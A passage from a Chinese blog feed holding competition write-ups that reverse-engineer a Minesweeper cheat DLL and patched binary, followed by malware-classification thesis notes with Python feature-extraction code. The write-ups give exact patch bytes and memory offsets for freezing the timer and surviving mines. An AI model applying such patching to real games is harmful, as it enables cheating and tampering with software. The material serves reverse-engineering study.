<span class="string">(Mask</span> <span class="string">3F)</span></span><br><span class="line">    <span class="attr">File OS:</span>          <span class="number">4</span> <span class="string">Unknown</span> <span class="string">Win32</span></span><br><span class="line">    <span class="attr">File type:</span>        <span class="number">2.0</span> <span class="string">Dll</span></span><br><span class="line">    <span class="attr">File date:</span>        <span class="number">00000000.00000000</span></span><br><span class="line">    <span class="attr">Translations:</span>     <span class="number">0804.</span><span class="string">03a8</span></span><br><span class="line">    <span class="attr">Information from resource tables:</span></span><br><span class="line">        <span class="attr">CompanyName:      TODO:</span> <span class="string">&lt;公司名&gt;</span></span><br><span class="line">        <span class="attr">ProductName:      TODO:</span> <span class="string">&lt;产品名&gt;</span></span><br><span class="line">        <span class="attr">InternalName:</span>     <span class="string">CheatTools.dll</span></span><br><span class="line">        <span class="attr">OriginalFilename:</span> <span class="string">CheatTools.dll</span></span><br><span class="line">        <span class="attr">ProductVersion:</span>   <span class="number">1.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">        <span class="attr">FileVersion:</span>      <span class="number">1.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">        <span class="attr">FileDescription:  TODO:</span> <span class="string">&lt;文件说明&gt;</span></span><br><span class="line">        <span class="attr">LegalCopyright:   TODO:</span> <span class="string">(C)</span> <span class="string">&lt;公司名&gt;。保留所有权利。</span></span><br></pre></td></tr></table></figure><p>接下来就是从dump里扒出来这个dll. <code>.writemem C:\CTF\CheatTools.dll 6e220000 (6e266000-0x1)</code></p><p>该dll已在内存中展开, 需要把Raw RawSize修正,才能被工具正常识别区段,<br>修复dll的区段地址: <code>Raw Adress -&gt; Virtual Address</code>. 将Raw Address和Virtual Address弄成一样.<br><img src="/2020/04/24/2020腾讯游戏安全竞赛决赛PC方向分析/1-2.png" alt></p><p>丢进IDA里发现有很多MFC的函数 所以丢进Resource Hacker 里看看窗口, 发现能明显地看出<code>CheatTool.dll</code>实现的功能 同时也能看到按钮对应的号码立即数<br><img src="/2020/04/24/2020腾讯游戏安全竞赛决赛PC方向分析/1-3.png" alt><br>能直观地看出四个功能功能分别是:</p><ul><li>暂停时间</li><li>遇雷不爆</li><li>一键游戏</li><li>地雷分布</li></ul><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><h3 id="暂停时间-amp-遇雷不爆"><a href="#暂停时间-amp-遇雷不爆" class="headerlink" title="暂停时间 &amp; 遇雷不爆"></a>暂停时间 &amp; 遇雷不爆</h3><p>在函数里找到两个更改memory的, 看了一下改的是初赛的两个. </p><p>patch inc -&gt; nope, 实现时间不增长; patch -&gt; jmp, 实现踩雷不爆.<br><img src="/2020/04/24/2020腾讯游戏安全竞赛决赛PC方向分析/patch2.png" alt><br><img src="/2020/04/24/2020腾讯游戏安全竞赛决赛PC方向分析/patch1.png" alt></p><ol><li>暂停时间, 函数偏移 <code>0x6E221660 - 0x6E220000 = 0x1660</code></li><li>遇雷不爆, 函数偏移 <code>0x6E2216D0 - 0x6E220000 = 0x16D0</code></li></ol><p>MEMORY里的地址是扫雷程序在内存里的VA, 放在ida里能看到<br><img src="/2020/04/24/2020腾讯游戏安全竞赛决赛PC方向分析/va.png" alt></p><h3 id="一键游戏"><a href="#一键游戏" class="headerlink" title="一键游戏"></a>一键游戏</h3><p>往下找几个函数, 就能找到. 开头调用了扫雷exe里的 <code>0x1005312</code>函数, <code>0x1005334</code>和<code>0x1005338</code>的值. 后面还用到了<code>0x1005340</code> 和 <code>100546C</code>的值.<br><img src="/2020/04/24/2020腾讯游戏安全竞赛决赛PC方向分析/autoplay1.png" alt></p><p>首先去动态调试原扫雷程序看看<code>0x1005312</code>函数的功能, 在唯一会调用<code>0x1005312</code>函数的<code>sub_10037E1</code>下断. 发现每次点击扫雷某一格子均会触发一次.<br><img src="/2020/04/24/2020腾讯游戏安全竞赛决赛PC方向分析/map.png" alt><br>所以dll里的<code>MEMORY[0x1005312](1,1)</code> 相当于自动在(1,1)开始游戏. </p><ol><li><code>0x1005334</code> 地图最大列数</li><li><code>0x1005338</code> 地图最大行数</li><li><code>0x1005340</code> 地图基址</li><li><code>v0 = MEMORY[0x1005338] * MEMORY[0x1005334] + 0x100546C</code> 地图边界</li><li>雷类型 = <code>0x8F</code>; 换行 = <code>0x10</code>; 空地 = <code>0x0F</code>; 数字表示扫出来的周边雷数(0x41, 0x42…); 死亡时变成<code>0xCC</code>.</li></ol><p>还原出来其中一个地图的信息, 去掉0x0F的空行, 对比扫雷结果, 的确是地图.</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>F <span class="number">0</span>F <span class="number">0</span>F <span class="number">0</span>F <span class="number">0</span>F <span class="number">0</span>F <span class="number">0</span>F <span class="number">8</span>F <span class="number">0</span>F </span><br><span class="line"><span class="number">0</span>F <span class="number">0</span>F <span class="number">0</span>F <span class="number">0</span>F <span class="number">0</span>F <span class="number">0</span>F <span class="number">8</span>F <span class="number">0</span>F <span class="number">0</span>F </span><br><span class="line"><span class="number">0</span>F <span class="number">0</span>F <span class="number">0</span>F <span class="number">8</span>F <span class="number">0</span>F <span class="number">0</span>F <span class="number">0</span>F <span class="number">0</span>F <span class="number">0</span>F </span><br><span class="line"><span class="number">0</span>F <span class="number">0</span>F <span class="number">8</span>F <span class="number">0</span>F <span class="number">0</span>F <span class="number">0</span>F <span class="number">0</span>F <span class="number">0</span>F <span class="number">0</span>F </span><br><span class="line"><span class="number">0</span>F <span class="number">0</span>F <span class="number">8</span>F <span class="number">0</span>F <span class="number">0</span>F <span class="number">0</span>F <span class="number">0</span>F <span class="number">0</span>F <span class="number">0</span>F </span><br><span class="line"><span class="number">0</span>F <span class="number">0</span>F <span class="number">0</span>F <span class="number">0</span>F <span class="number">0</span>F <span class="number">0</span>F <span class="number">0</span>F <span class="number">0</span>F <span class="number">0</span>F </span><br><span class="line"><span class="number">0</span>F <span class="number">0</span>F <span class="number">0</span>F <span class="number">8</span>F <span class="number">0</span>F <span class="number">0</span>F <span class="number">0</span>F <span class="number">0</span>F <span class="number">0</span>F </span><br><span class="line"><span class="number">0</span>F <span class="number">0</span>F <span class="number">0</span>F <span class="number">0</span>F <span class="number">0</span>F <span class="number">0</span>F <span class="number">8</span>F <span class="number">8</span>F <span class="number">0</span>F </span><br><span class="line"><span class="number">0</span>F <span class="number">8</span>F <span class="number">0</span>F <span class="number">0</span>F <span class="number">8</span>F <span class="number">0</span>F <span class="number">0</span>F <span class="number">0</span>F <span class="number">0</span>F</span><br></pre></td></tr></table></figure><p><img src="/2020/04/24/2020腾讯游戏安全竞赛决赛PC方向分析/map1.png" alt></p><p>最后遍历棋盘, 假如不是雷就<code>playat(j,i)</code>, finish this game automatically!<br><img src="/2020/04/24/2020腾讯游戏安全竞赛决赛PC方向分析/search.png" alt></p><p>一键游戏, 函数偏移 <code>0x6E221820 - 0x6E220000 = 0x1820</code></p><h3 id="地雷分布"><a href="#地雷分布" class="headerlink" title="地雷分布"></a>地雷分布</h3><p><img src="/2020/04/24/2020腾讯游戏安全竞赛决赛PC方向分析/autoplay.png" alt><br>前面获取<code>0x1005340</code>地图信息的过程类似, 最后是打印出雷的数量和位置(sub_6E223040函数里有vprint函数, 所以可以推断是打印)</p><p><img src="/2020/04/24/2020腾讯游戏安全竞赛决赛PC方向分析/print1.png" alt><br><img src="/2020/04/24/2020腾讯游戏安全竞赛决赛PC方向分析/print2.png" alt></p><p>地图分步, 函数偏移 <code>0x6E221AC0 - 0x6E220000 = 0x1AC0</code></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h3><ol><li>暂停时间, 函数偏移 <code>0x6E221660 - 0x6E220000 = 0x1660</code></li><li>遇雷不爆, 函数偏移 <code>0x6E2216D0 - 0x6E220000 = 0x16D0</code></li><li>一键游戏, 函数偏移 <code>0x6E221820 - 0x6E220000 = 0x1820</code></li><li>地图分步, 函数偏移 <code>0x6E221AC0 - 0x6E220000 = 0x1AC0</code></li></ol><h3 id="过程总结"><a href="#过程总结" class="headerlink" title="过程总结"></a>过程总结</h3><ol><li>用 windbg打开dump文件并提取.dll文件.</li><li>提取后要修复Raw Address.</li><li>dll里使用的是exe文件的va.</li></ol>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;毕设摸鱼 emmmmm试一试能不能把决赛的ring3给做了 ring0放弃 驱动不会&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
    <category term="Writeup" scheme="http://Ronpa.top/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>2020腾讯游戏安全竞赛初赛PC方向分析</title>
    <link href="http://ronpa.top/2020/04/08/2020%E8%85%BE%E8%AE%AF%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9BPC%E6%96%B9%E5%90%91%E5%88%86%E6%9E%90/"/>
    <id>http://ronpa.top/2020/04/08/2020%E8%85%BE%E8%AE%AF%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9BPC%E6%96%B9%E5%90%91%E5%88%86%E6%9E%90/</id>
    <published>2020-04-08T18:09:15.000Z</published>
    <updated>2021-02-16T21:38:40.480Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>毕设中期答辩 忙着处理样本和写脚本<strike>(学术不端)</strike> 所以初赛看都没看<br>回头试试 但好像只做的出最简单的一道没啥太难的点 第二题看都看不懂 驱动不会 菜呀弟弟</p></blockquote><a id="more"></a><h1 id="ring3"><a href="#ring3" class="headerlink" title="ring3"></a>ring3</h1><h2 id="简介-思路"><a href="#简介-思路" class="headerlink" title="简介+思路"></a>简介+思路</h2><p>简述一下 就是 给了个修改前的扫雷游戏和PC运行时的一个dump文件(记录PC运行的程序之类的), 然后dump文件里记录了运行过修改后的扫雷游戏的, 要求找出修改后的扫雷游戏修改的两处代码和分别实现了什么功能.</p><p>大致思路, 找出dump里的程序binary并和原程序binary匹配. 找到修改过的地方并分析.</p><h2 id="手动提取"><a href="#手动提取" class="headerlink" title="手动提取"></a>手动提取</h2><p>因为改的应该是代码就直接去找代码段<code>.text</code>里的内容 也就直接在ida里找最开头的函数 到最结尾的函数 并复制做匹配参考</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">start:</span></span><br><span class="line"><span class="number">55</span> <span class="string">8B</span> <span class="string">EC</span> <span class="number">83</span> <span class="string">EC</span> <span class="string">2C</span> <span class="string">8B</span> <span class="number">45</span>  <span class="number">08</span> <span class="string">0F</span> <span class="string">B7</span> <span class="string">C8</span> <span class="string">C1</span> <span class="string">E8</span> <span class="number">10</span> <span class="number">89</span></span><br><span class="line"><span class="number">45</span> <span class="string">EC</span> <span class="string">A1</span> <span class="string">2C</span> <span class="string">5B</span> <span class="number">00</span> <span class="number">01</span> <span class="number">53</span>  <span class="number">83</span> <span class="string">C0</span> <span class="string">E8</span> <span class="number">56</span> <span class="string">FF</span> <span class="number">75</span> <span class="string">EC</span> <span class="string">8B</span></span><br><span class="line"></span><br><span class="line"><span class="attr">end:</span></span><br><span class="line"><span class="string">FF</span> <span class="number">75</span> <span class="string">FC</span> <span class="string">FF</span> <span class="number">15</span> <span class="number">14</span> <span class="number">10</span> <span class="number">00</span>  <span class="number">01</span> <span class="string">8B</span> <span class="string">C6</span> <span class="string">EB</span> <span class="number">02</span></span><br></pre></td></tr></table></figure><p>dump里大概 <code>0x045E089 - 0x0460CE</code><br><img src="/2020/04/08/2020腾讯游戏安全竞赛初赛PC方向分析/dump-s.png" alt><br><img src="/2020/04/08/2020腾讯游戏安全竞赛初赛PC方向分析/dump-e.png" alt></p><p>同理 exe里大概是 <code>0x0080C - 0x03552</code></p><p>手动提取后两个大小一致了<br><img src="/2020/04/08/2020腾讯游戏安全竞赛初赛PC方向分析/size.png" alt></p><h2 id="比对修改程序"><a href="#比对修改程序" class="headerlink" title="比对修改程序"></a>比对修改程序</h2><p><img src="/2020/04/08/2020腾讯游戏安全竞赛初赛PC方向分析/cmp.png" alt></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">exe-winmine</span></span><br><span class="line"><span class="string">(前面的方便用来搜索的内容</span> <span class="number">00010074</span> <span class="string">1E813D9C</span> <span class="number">570001E7</span> <span class="string">0300007D</span> <span class="number">12</span><span class="string">)</span></span><br><span class="line"><span class="attr">0x1BE9 - 0x1BEE:</span> <span class="string">FF059C57</span> <span class="number">0001</span></span><br><span class="line"><span class="string">(FFFFEB28</span> <span class="string">6A4C5056</span> <span class="string">E81AF9FF</span> <span class="string">FF)</span></span><br><span class="line"><span class="attr">0x2185 - 0x2186:</span> <span class="string">6A00</span></span><br><span class="line"></span><br><span class="line"><span class="string">dump-winmine</span></span><br><span class="line"><span class="attr">0x1BE9 - 0x1BEE:</span> <span class="number">90909090</span> <span class="number">9090</span></span><br><span class="line"><span class="attr">0x2185 - 0x2186:</span> <span class="string">EB1D</span></span><br></pre></td></tr></table></figure><h3 id="第一块修改代码对比分析"><a href="#第一块修改代码对比分析" class="headerlink" title="第一块修改代码对比分析"></a>第一块修改代码对比分析</h3><p><strong>使用ida搜索功能注意大小端序的变化</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">0x01002FF5:</span></span><br><span class="line"><span class="string">FF059C57</span> <span class="number">0001</span>     <span class="string">-&gt;</span> <span class="number">90909090</span> <span class="number">9090</span></span><br><span class="line"><span class="string">inc</span> <span class="string">dword_100579C</span> <span class="string">-&gt;</span> <span class="string">nop</span></span><br></pre></td></tr></table></figure><p><img src="/2020/04/08/2020腾讯游戏安全竞赛初赛PC方向分析/ida-exe1.png" alt><br><img src="/2020/04/08/2020腾讯游戏安全竞赛初赛PC方向分析/ida-exe1-1.png" alt></p><p>修改的时候突然发现 <code>0x90</code>机器码对应的是 <code>nop</code>, 也就是这个inc直接被nop了.<br>所以每次执行if语句块 变量 <code>++dword_100579C</code>不会被执行<br><img src="/2020/04/08/2020腾讯游戏安全竞赛初赛PC方向分析/1-2.png" alt><br>看这段代码猜都能猜到 扫雷里的<code>999</code>是时间上限 <code>dword_100579C</code> 是计时器 nop掉就不会加时间了 改了之后 如下图 时间不会动(即使我完成了扫雷时间还是001)<br><img src="/2020/04/08/2020腾讯游戏安全竞赛初赛PC方向分析/1-5.png" alt></p><p>跟进<code>sub_10028B5</code>后发现<code>dword_100579C</code>全局变量在一个类似输出时间成绩的函数里 又调用了<code>sub_1002752</code><br><code>dword_100579C</code> 赋值到<code>a3</code></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int __stdcall sub_1002752(HDC hdc, int xDest, int a3)</span><br><span class="line">SetDIBitsToDevice</span><br><span class="line">(hdc,xDest,<span class="number">16</span>,<span class="number">0xD</span>u,<span class="number">0x17</span>u,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x17</span>u,(char *)dword_100595C + dword_1005A60[a3],dword_100595C,<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>第十个参数 lpvBits：指向存储DIB颜色数据的字节类型数组的指针 也就是指向一个位图. 在这个函数下断点, 估计只要指向一个那个显示时间的图片就能证明 这个是时间计时器<br><img src="/2020/04/08/2020腾讯游戏安全竞赛初赛PC方向分析/1-3.png" alt><br>地址 <code>0x010170F4</code> 内容如下图:<br><img src="/2020/04/08/2020腾讯游戏安全竞赛初赛PC方向分析/1-4.png" alt><br>能看出来是关于数字显示的位图, 也就是扫雷右上角的 数码计时器的图片(三个叠在一起), 所以进一步确定, nop掉的代码 <code>++dword_100579C</code> 是和计时有关的. 修改后时间不会动.</p><h3 id="第二块修改代码对比分析"><a href="#第二块修改代码对比分析" class="headerlink" title="第二块修改代码对比分析"></a>第二块修改代码对比分析</h3><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x01003591</span>:</span><br><span class="line"><span class="number">6</span>A00      -&gt; <span class="number">1</span>DEB</span><br><span class="line"><span class="keyword">push</span>    <span class="number">0</span> -&gt; <span class="keyword">jmp</span>     short loc_10035B0</span><br></pre></td></tr></table></figure><p><img src="/2020/04/08/2020腾讯游戏安全竞赛初赛PC方向分析/2-1.png" alt><br><img src="/2020/04/08/2020腾讯游戏安全竞赛初赛PC方向分析/2-2.png" alt><br>先看一下改了之后的结果 发现是实现了 踩了雷也不会死的效果<br><img src="/2020/04/08/2020腾讯游戏安全竞赛初赛PC方向分析/2-3.png" alt><br>猜一下实现原理 这段改过的代码估计是在条件判断 踩中雷之后的代码块里, 加一条<code>jmp</code>跳过下面游戏结束的<code>jmp</code>跳出到继续游戏.</p><p>补一下 <code>jmp</code>字节码的知识:</p><ol><li>Short Jump（短跳转）机器码 EB rel8 只能跳转到256字节的范围内 </li><li>Near Jump（近跳转）机器码 E9 rel16/32 可跳至同一个段的范围内的地址 </li><li>Far Jump（远跳转）机器码EA ptr 16:16/32 可跳至任意地址，使用48位/32位全指针 </li></ol><p>要注意的是，短跳转和近跳转指令中包含的操作数都是相对于(E)IP的偏移，而远跳转指令中包含的是目标的绝对地址，所以短/近跳转会出现跳至同一目标的指令机器码不同，不仅会不同，而且应该不同。而远跳转中包含的是绝对地址，因此转移到同一地址的指令机器码相同<br>下面的指令是这样计算偏移的. </p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">004</span>A2FCE    ^ E9 <span class="number">072</span>BFEFF   jmp     <span class="number">00485</span>ADA </span><br><span class="line">======== ======== ======== ======== ======== </span><br><span class="line"><span class="number">485</span>ADA<span class="number">-4</span>A2FCE=  FFFE2B0C</span><br><span class="line"></span><br><span class="line">目标地址 - 原地址 = 机器码</span><br></pre></td></tr></table></figure><p>这里只是指向当前指令的IP处,实际计算跳转地址要去掉当前指令的长度,当前的跳转指令需要5个字节,<code>FFFE2B0C-5=FFFE2B07</code></p><p>所以这题的的计算 <code>EB 1D =&gt; 0x01003591 + 0x1D + 2 =  0x10035B0</code></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>光对比前后功能的话很简单 第一个完完整整也很好分析 第二个有点麻烦 还是直接对比猜结果吧.<br> 毕设太烦啦 比赛的时候看题的话也是有机会提交拿分的 但第二个是看了也完全看不懂2333333<br>噼里啪啦 菜逼哈哈哈哈哈哈哈哈哈</p><p>又想加点个人私活在这里了 以前觉得自己的博客没人看 但当我不知道哪天脑子一抽把它加到了搜索引擎上去的时候 好像有那么一点点不同了 </p><p>还是一如既往的菜+懒 2019年一整年都没怎么好好研究逆向 周围的人也慢慢开始转Android 水平对比应该还没2018年的我强 就有时候翻翻博客会感叹 我当时怎么这么有耐心 这段克难逆了233333 噼里啪啦菜逼</p><p>学英语 申请学校 学了一年多了语言要求还没到(因为对我来说根本不可能小分满足要求233333) 现如今挣扎在不卡小分的duolingo 对不起 我一开始还挺嫌弃你的. 也有人愿意去了解我接触我 发现自闭外壳下的可爱(真不要脸)和毒舌23333 对不起改不掉了 只能装得稍微人畜无害点233333 感谢!!!!!! 哈哈哈哈哈这段时间很有趣 也挺充实的 希望能有一段很快乐压力不大吃吃喝喝聊聊天游乐园无疫情的伦敦生活</p><p>头发留一年半了 过了锁骨 慢慢习惯 也慢慢偏女性? 害 我天生黄色的头发 不留长了多可惜呀</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;毕设中期答辩 忙着处理样本和写脚本&lt;strike&gt;(学术不端)&lt;/strike&gt; 所以初赛看都没看&lt;br&gt;回头试试 但好像只做的出最简单的一道没啥太难的点 第二题看都看不懂 驱动不会 菜呀弟弟&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
    <category term="Writeup" scheme="http://Ronpa.top/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>毕设文章参考阅读笔记</title>
    <link href="http://ronpa.top/2020/03/05/%E6%AF%95%E8%AE%BE%E6%96%87%E7%AB%A0%E5%8F%82%E8%80%83%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/"/>
    <id>http://ronpa.top/2020/03/05/%E6%AF%95%E8%AE%BE%E6%96%87%E7%AB%A0%E5%8F%82%E8%80%83%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/</id>
    <published>2020-03-05T21:10:14.000Z</published>
    <updated>2021-01-25T19:17:50.942Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><a href="https://github.com/apachecn/AiLearning" target="_blank" rel="noopener">https://github.com/apachecn/AiLearning</a> GitHub上的ai学习汇总 跟着路线图学</p></blockquote><a id="more"></a><h1 id="2020-03-05"><a href="#2020-03-05" class="headerlink" title="2020.03.05"></a>2020.03.05</h1><p>目标任务:</p><ol><li>阅读三篇文章+1</li><li>给收集到的样本加壳 比例参考论文 <strong>Pattern Recognition Techniques for the Classification of Malware Packers</strong></li><li>用ANN跑一遍构建模型 看看是怎么选择特征值的</li><li>完成开题答辩PPT</li></ol><h2 id="如何用程序判定一个PE文件是否加壳"><a href="#如何用程序判定一个PE文件是否加壳" class="headerlink" title="如何用程序判定一个PE文件是否加壳"></a>如何用程序判定一个PE文件是否加壳</h2><p>讲了peid的原理 但不完全 没有具体的代码 对于模型的搭建参考价值不太大<br><a href="https://bbs.pediy.com/thread-115515.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-115515.htm</a></p><h3 id="信息熵"><a href="#信息熵" class="headerlink" title="信息熵"></a>信息熵</h3><p>以我的理解就是在一段的数据中其所携带的信息量。应用在判定PE是否加壳时，“信息熵”可以这么理解，计算一个PE文件的信息量或者其中某段（Section）的信息量。当这个熵的值超过一定阈值时，则该PE或某段被加壳(Packed).就是压缩数据往往携带着更多的信息量，PE文件携带信息量得多的就意味着可能被加壳了。</p><p><code>**信息熵**可以作为其中一个特征值</code></p><p><code>误报率相当哪个的高 所以要引入多特征值的 机器学习</code></p><p><img src="/2020/03/05/毕设文章参考阅读笔记/1-1.png" alt></p><h3 id="PEID的原理"><a href="#PEID的原理" class="headerlink" title="PEID的原理"></a>PEID的原理</h3><ol><li>重新组织需要计算的数据<br> i．以下数据不列入计算熵的范围：导出表数据、导入表数据、资源数据、重定向数据。<br>   ii.  尾部全0的数据不列入计算熵的范围。<br>   iii. PE头不列入计算熵的范围。</li><li>分别计算每一部分数据的熵E和该部分数据大小S。</li><li>以下列公式得到整个PE文件的熵 Entropy = ∑Ei * Si / ∑Si (i = 1,2…n)。</li></ol><h3 id="Process-Explorer原理"><a href="#Process-Explorer原理" class="headerlink" title="Process Explorer原理"></a>Process Explorer原理</h3><p>就是十条条件判断, 但因为看不懂 仅做参考 </p><p><code>这里明天也可以提一下, 这点有点像特征码</code></p><h3 id="特征码比对"><a href="#特征码比对" class="headerlink" title="特征码比对"></a>特征码比对</h3><p>用人工维护特征这种方法，向来就具备以下几个弱点：</p><ol><li>滞后性 特征只能针对已知的壳，那些最新的壳，你需要时间去发现和收集</li><li>局限性 你不可能提取出所有壳的特征，判定程序只能无奈的返回Unknown</li><li>误判 人永远无法保证100%的正确</li></ol><p>即便如此让机器代理人来提取特征仍然是有可能的。设计一个类似神经网络的系统，让壳样本不断的去训练你的特征 虽然滞后性无法避免但可以缩短时间；虽然局限性无法根除，但可以降低比率；误判无法保证100%，那就保证99.999999%。</p><p><code>这段可以当做用来介绍传统静态查壳的工作原理和缺点</code></p><p><strong><code>此文明天用于介绍传统的侦壳方法 三种</code></strong></p><h2 id="利用机器学习进行恶意代码分类"><a href="#利用机器学习进行恶意代码分类" class="headerlink" title="利用机器学习进行恶意代码分类"></a>利用机器学习进行恶意代码分类</h2><p>微软的一个比赛 有数据集<br><a href="https://blog.csdn.net/maspchen/article/details/50589261" target="_blank" rel="noopener">介绍帖</a><br><a href="http://bindog.github.io/blog/" target="_blank" rel="noopener">http://bindog.github.io/blog/</a><br><a href="https://github.com/bindog/ToyMalwareClassification" target="_blank" rel="noopener">代码</a></p><p>有图版 ttp://<a href="http://www.mottoin.com/detail/3222.html" target="_blank" rel="noopener">www.mottoin.com/detail/3222.html</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这篇用于明天机器学习这块的介绍</span><br></pre></td></tr></table></figure><h3 id="灰度图特征"><a href="#灰度图特征" class="headerlink" title="灰度图特征"></a>灰度图特征</h3><p>这个概念最早是2011年由加利福尼亚大学的Nataraj和Karthikeyan在他们的论文 <code>Malware Images: Visualization and Automatic Classification</code>中提出来的，思路非常新颖，把一个二进制文件以灰度图的形式展现出来，利用图像中的纹理特征对恶意代码进行聚类</p><p>恶意代码图像的形式并不固定，研究人员可根据实际情况进行调整和创新。 国内这方面的研究较少,去年在通信学报上有一篇<code>《基于纹理指纹的恶意代码变种检测方法研究》</code>,是由北京科技大学的韩晓光博士和北京启明星辰研究院等合作发表的<br>每个字节范围在00~FF之间，刚好对应灰度图0~255</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">import</span> numpy</span><br><span class="line">from PIL <span class="built_in">import</span> Image</span><br><span class="line"><span class="built_in">import</span> binascii</span><br><span class="line">def getMatrixfrom_bin(filename,width):</span><br><span class="line">    <span class="keyword">with</span> open(filename, 'rb') as f:</span><br><span class="line">        <span class="attr">content</span> = f.read()</span><br><span class="line">    <span class="attr">hexst</span> = binascii.hexlify(content)  <span class="comment">#将二进制文件转换为十六进制字符串</span></span><br><span class="line">    <span class="attr">fh</span> = numpy.array([int(hexst[i:i+<span class="number">2</span>],<span class="number">16</span>) for i <span class="keyword">in</span> range(<span class="number">0</span>, len(hexst), <span class="number">2</span>)])  <span class="comment">#按字节分割</span></span><br><span class="line">    <span class="attr">rn</span> = len(fh)/width</span><br><span class="line">    <span class="attr">fh</span> = numpy.reshape(fh[:rn*width],(-<span class="number">1</span>,width))  <span class="comment">#根据设定的宽度生成矩阵</span></span><br><span class="line">    <span class="attr">fh</span> = numpy.uint8(fh)</span><br><span class="line">    return fh</span><br><span class="line"><span class="attr">filename</span> = <span class="string">"your_bin_filename"</span></span><br><span class="line"><span class="attr">im</span> = Image.fromarray(getMatrixfrom_bin(filename,<span class="number">512</span>)) <span class="comment">#转换为图像</span></span><br><span class="line">im.save(<span class="string">"your_img_filename.png"</span>)</span><br></pre></td></tr></table></figure><p>在Nataraj和Karthikeyan的论文中采用的是GIST特征，GIST特征常用于场景分类任务(如城市、森林、公路和海滩等)，用一个五维的感知维度来代表一个场景的主要内容。简单来说，输入图像，输出为对应的GIST描述符，如下图所示<br><img src="/2020/03/05/毕设文章参考阅读笔记/1-2.png" alt></p><p><code>在matlab实现里面每个图像的GIST描述符都用一个向量表示，最后用SVM完成分类训练</code></p><h3 id="OpCode-n-gram"><a href="#OpCode-n-gram" class="headerlink" title="OpCode n-gram"></a>OpCode n-gram</h3><p>这篇没有解释的很透彻</p><p>将n-gram应用于恶意代码识别的想法最早由Tony等人在2004年的论文N-gram-based Detection of New Malicious Code中提出，不过他们的方法是基于ByteCode的。2008年Moskovitch等人的论文Unknown Malcode Detection Using OPCODE Representation 中提出利用OpCode代替ByteCode更加科学</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 从.asm文件获取Opcode序列</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getOpcodeSequence</span><span class="params">(filename)</span>:</span></span><br><span class="line">    opcode_seq = []</span><br><span class="line">    p = re.compile(<span class="string">r's([a-fA-F0-9]&#123;2&#125;s)+s*([a-z]+)'</span>)</span><br><span class="line">    <span 